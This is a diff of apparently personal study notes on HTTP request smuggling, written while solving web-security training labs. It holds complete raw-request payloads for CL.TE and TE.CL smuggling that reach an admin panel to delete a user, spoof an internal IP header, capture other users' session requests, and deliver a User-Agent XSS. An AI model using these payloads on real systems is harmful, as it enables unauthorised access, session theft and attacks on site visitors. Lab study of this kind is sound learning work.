@@ -1,6 +1,11 @@
+# HTTP Request Smuggling
 ## Definition
 
 http smuggling attack is a way for interfering with the way a website processes a sequence of http requests, allowing an attacker to have some privileged access.
+
+### Note
+When we have a get request, ti ignore the first header user X-Ignore attribute
+for POST request, use the body.
 
 ## How does it arise ?
 
@@ -207,7 +212,7 @@ To solve the lab this is the used payload :
 
 ![image](./img/solutionTETE.png)
 
-# Confirming CL.TE vulnerabilities using differential responses
+## Confirming CL.TE vulnerabilities using differential responses
 
 the image sums it up : 
 
@@ -240,7 +245,7 @@ and the normal request :
 
 Recap : the front uses CL, so we send all the request, the back uses TE so we tell him to end the request at `0\r\n\r\n` so the next `GET` will be on hold to prefix the next request. 
 
-# Confirming TE.CL vulnerabilities using differential responses
+## Confirming TE.CL vulnerabilities using differential responses
 
 Thanks to `Jarno Timmermans` the image is self explanatory: 
 
@@ -285,7 +290,7 @@ Recap : So the front end since it's using TE, it will send all the payload, and 
     \r\n
 and the content length is set to 13 it's 7 the size of `\r\n0\r\n\r\n` + `GET \` normally i mad a mistake it should be 14 since i used POST =) 
 
-## Lab solution
+## Lab 1  solution
 
 After detecting it was CL.TE vulnerability, we want to delete the username carlos, and access admin page, since the authorization doesn't work on the Front, the payload i used is : 
 
@@ -318,3 +323,156 @@ and for the normal request :
 Explications : 
 
 Since the backend uses TE, we want to poison with with `GET /admin`, so the backend will get 3 aaa and 0 and it will stop processing the request putting `GET/admin` on the queue, and we change `Host: localhost` to bypass the filters and the content body, just crap to make everything else into a body that is ignored. 
+
+## Lab 2  solution
+
+Same as the previous example : no need to explanations this time 
+The payload used :
+
+    POST / HTTP/1.1
+    Host: 0ac0002003d090af81a42f2f00780000.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    50
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Length: 6
+    \r\n
+    0\r\n
+    \r\n
+
+Following payload : 
+
+    POST / HTTP/1.1
+    Host: 0ac0002003d090af81a42f2f00780000.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 11
+
+    foo=bar
+
+## lab 3 Revealing front-end request rewriting
+
+We have the front end server adding headers into the request, so at that point we can't know for sure what it is, so if we want to discover the hidden header, we need to search for a post method and smuggle the parameter within the ,next request : 
+example: 
+
+    POST / HTTP/1.1
+    Host: 0a90007704849095848f4fe2002a0016.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 204
+    Transfer-Encoding: chunked
+
+    3
+    abc
+    0
+
+    POST / HTTP/1.1
+    Host: 0a90007704849095848f4fe2002a0016.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 178
+
+    search=foobar
+NB : We have to make sure that the content length is the minimum length of the next request sent, because we don't know how many can add the front server to the request.
+
+the parameter `search` do exists o, the page, and the response will be something like this : 
+
+    <section class=blog-header>
+    <h1>0 search results for 'foobarPOST / HTTP/1.1
+        X-ahjRdz-Ip: 89.84.71.12
+        Host: 0a90007704849095848f4fe2002a0016.web-security-academy.net
+        Content-Type: application/x-www-form-urlencoded
+        Content-'
+    </h1>
+                      
+And we know that `X-ahjRdz-Ip` is what we're looking for, then we can inject it to the next request to have admin access :
+
+    POST / HTTP/1.1
+    Host: 0a90007704849095848f4fe2002a0016.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 196
+    Transfer-Encoding: chunked
+
+    3
+    abc
+    0
+
+    POST /admin HTTP/1.1
+    Host: 0a90007704849095848f4fe2002a0016.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    X-ahjRdz-Ip: 127.0.0.1
+    Content-Length: 6
+
+    x=
+
+
+
+## lab 4 : Capturing other users' requests
+
+The goal here is to create a smuggle request and wait for and admin to connect for example, in order to concat his request to ours.
+
+for example we have a blog post, we launch this payload with larger ( not too large) Content-Length :
+    GET / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: chunked
+    Content-Length: 330
+
+    0
+
+    POST /post/comment HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 400
+    Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+    csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+
+and we send the normal request just after, we keep doing that and wait until an admin connects to steals his credentials.
+
+The payload i used to solve the lab :
+
+    POST / HTTP/1.1
+    Host: 0a880006044fc97f83f12d0d002d00c8.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 333
+    Transfer-Encoding: chunked
+
+    0
+
+    POST /post/comment HTTP/1.1
+    Host: 0a880006044fc97f83f12d0d002d00c8.web-security-academy.net
+    Cookie: session=h3fIWuvWkg4iTSE7YMTx2TXh89Z6I1sK
+    Content-Length: 910
+    Content-Type: application/x-www-form-urlencoded
+
+    csrf=pb4FYyQ2GG7hgi8WXEorpd1FlfZBWxV1&postId=7&name=h&email=em%40em.com&website=https%3A%2F%2Flink.com&comment=h
+
+Be careful the next payload sent, needs to have a real length of the same content-length in the smuggled payload ( her in the example 910), and keep trying until getting 200 response ok, means that an admin got connected.
+
+## lab 5: Using HTTP request smuggling to exploit reflected XSS
+We suppose that a reflected XSS happens in the `User-Agent`, we can see it in burp if we change the user agent, it's a hidden html tag, and the payload to inject the xss i used is the following : 
+
+    POST / HTTP/1.1
+    Host: 0a52004104d2c654831b7e24006e00b0.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 221
+    Transfer-Encoding: chunked
+
+    3
+    aaa
+    0
+
+    GET /post?postId=8 HTTP/1.1
+    Host: 0a52004104d2c654831b7e24006e00b0.web-security-academy.net
+    Cookie: session=sV9xldpycYUrRCSjRd1b7PjNRlbbFkFp
+    User-Agent: "><script>alert(1)</script>
+    Content-length: 4
+
+    x=
+
+* It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
+* It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
+
+## cache poisoning smuggled request
+
+Didn't really understand what is happening here
